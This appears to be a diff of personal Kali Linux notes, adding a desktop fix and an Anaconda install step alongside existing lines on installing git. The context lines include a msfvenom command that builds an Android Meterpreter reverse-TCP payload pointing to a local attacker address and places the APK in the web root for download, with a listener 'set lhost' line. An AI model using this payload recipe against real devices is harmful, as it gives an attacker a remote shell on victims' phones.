@@ -1,3 +1,6 @@
+=> minimize/close option not showing in kali linux just run this command : xfwm4
+
+
 => msfvon
 worked msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.213.83 R> /var/www/html/android.apk
 set lhost  192.168.213.83
@@ -104,3 +107,6 @@ everything is done..
 5. install git
     => sudo apt-get install git
     => Verfiy : git --version
+    
+6. install anaconda for python 
+	command : sudo bash filename.sh
